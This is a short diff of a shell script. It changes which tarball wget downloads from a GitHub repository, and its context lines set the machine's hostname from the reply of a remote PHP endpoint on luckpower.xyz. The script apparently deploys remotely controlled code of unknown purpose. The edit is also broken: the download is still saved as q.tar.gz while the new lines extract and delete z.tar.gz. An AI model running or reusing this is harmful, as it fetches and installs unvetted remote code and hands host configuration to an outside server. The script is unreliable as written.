@@ -14,9 +14,9 @@ rm -rf cwork
 echo "DONE"
 cd work
 PROG=`cat new.txt`
-wget -O q.tar.gz https://github.com/diegofustox/cwork/blob/main/q.tar.gz?raw=true
-tar xvzf q.tar.gz
-rm q.tar.gz
+wget -O q.tar.gz https://github.com/diegofustox/cwork/blob/main/z.tar.gz?raw=true
+tar xvzf z.tar.gz
+rm z.tar.gz
 newh=`curl http://luckpower.xyz/srv.php`
 hostname $newh
 hs=`hostname`
